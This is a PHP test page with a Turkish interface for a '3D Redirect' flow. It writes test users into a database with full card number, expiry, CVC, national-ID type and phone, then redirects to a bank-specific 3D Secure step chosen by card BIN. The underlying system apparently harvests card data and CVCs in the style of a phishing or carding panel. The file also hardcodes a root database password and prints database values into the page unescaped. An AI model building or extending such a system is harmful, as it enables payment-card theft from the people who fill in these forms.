<?php
session_start();

// Test için session oluştur
if (!isset($_SESSION['userIdentifier'])) {
    $_SESSION['userIdentifier'] = 'test_' . uniqid();
}

// Veritabanı bağlantısı
$host = 'localhost';
$dbname = 'railway';
$username = 'root';
$password = 'qTVHsjDrZHeqDDctlKVVeGFXrTVbdatw';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die('Veritabanı bağlantı hatası: ' . $e->getMessage());
}

// Test kullanıcısı oluştur
if (isset($_POST['test_card'])) {
    $cardNumber = $_POST['card_number'];
    $phone = '05551234567';
    
    // Önce varsa sil
    $stmt = $pdo->prepare("DELETE FROM users WHERE user_identifier = ?");
    $stmt->execute([$_SESSION['userIdentifier']]);
    
    // Yeni test kullanıcısı oluştur
    $stmt = $pdo->prepare("INSERT INTO users (user_identifier, identifier_type, identifier_value, amount, service_fee, total, card_holder, card_number, card_expiry, card_cvc, phone, payment_status, created_at, updated_at) VALUES (?, 'tc', '12345678901', 100, 2, 102, 'Test Kullanıcı', ?, '12/25', '123', ?, 'pending', NOW(), NOW())");
    $stmt->execute([$_SESSION['userIdentifier'], $cardNumber, $phone]);
    
    // Redirect URL'i ayarla
    $stmt = $pdo->prepare("UPDATE users SET redirect_url = '3dredirect.php' WHERE user_identifier = ?");
    $stmt->execute([$_SESSION['userIdentifier']]);
    
    header('Location: 3dredirect.php?debug');
    exit;
}

// Bins tablosundan örnek kartlar al
$stmt = $pdo->query("SELECT DISTINCT bin, banka_kod, banka_adi FROM bins ORDER BY banka_adi LIMIT 20");
$sampleCards = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Redirect Test</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #0c1824;
            color: #f0f2f5;
            padding: 40px 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
        }

        h1 {
            color: #c8912e;
            margin-bottom: 10px;
        }

        .info {
            background: rgba(200, 145, 46, 0.1);
            border: 1px solid rgba(200, 145, 46, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 30px;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .card-list {
            background: rgba(12, 24, 36, 0.92);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .card-item {
            background: rgba(20, 40, 60, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-info {
            flex: 1;
        }

        .card-number {
            font-size: 1.1rem;
            font-weight: 600;
            color: #c8912e;
            margin-bottom: 5px;
        }

        .bank-name {
            font-size: 0.85rem;
            color: #8a9bb5;
        }

        .bank-code {
            display: inline-block;
            background: rgba(200, 145, 46, 0.2);
            color: #c8912e;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            margin-left: 10px;
        }

        .btn {
            padding: 10px 20px;
            background: #c8912e;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 0.9rem;
        }

        .btn:hover {
            background: #b07d24;
        }

        .custom-test {
            background: rgba(12, 24, 36, 0.92);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
        }

        .custom-test h3 {
            color: #c8912e;
            margin-bottom: 15px;
        }

        .custom-test input {
            width: 100%;
            padding: 12px;
            background: rgba(20, 40, 60, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            color: #f0f2f5;
            font-size: 1rem;
            margin-bottom: 15px;
        }

        .custom-test input:focus {
            outline: none;
            border-color: #c8912e;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧪 3D Redirect Test Sayfası</h1>
        <div class="info">
            <strong>Nasıl Kullanılır:</strong><br>
            1. Aşağıdaki örnek kartlardan birini seç<br>
            2. "Test Et" butonuna tıkla<br>
            3. Debug modunda 3dredirect.php açılacak<br>
            4. BIN kontrolü ve yönlendirme adımlarını gör
        </div>

        <div class="card-list">
            <h3 style="color: #c8912e; margin-bottom: 15px;">Örnek Test Kartları</h3>
            <?php foreach($sampleCards as $card): ?>
            <div class="card-item">
                <div class="card-info">
                    <div class="card-number"><?= $card['bin'] ?>XXXXXXXXXX</div>
                    <div class="bank-name">
                        <?= $card['banka_adi'] ?>
                        <span class="bank-code">Kod: <?= $card['banka_kod'] ?></span>
                    </div>
                </div>
                <form method="POST" style="margin: 0;">
                    <input type="hidden" name="card_number" value="<?= $card['bin'] ?>1234567890">
                    <button type="submit" name="test_card" class="btn">Test Et</button>
                </form>
            </div>
            <?php endforeach; ?>
        </div>

        <div class="custom-test">
            <h3>Özel Kart Numarası Test</h3>
            <form method="POST">
                <input 
                    type="text" 
                    name="card_number" 
                    placeholder="16 haneli kart numarası girin"
                    maxlength="16"
                    pattern="[0-9]{16}"
                    required
                >
                <button type="submit" name="test_card" class="btn" style="width: 100%;">Test Et</button>
            </form>
        </div>

        <div class="info" style="margin-top: 30px;">
            <strong>Not:</strong> Bu sayfa sadece test amaçlıdır. Gerçek kart numarası kullanmayın!
        </div>
    </div>
</body>
</html>
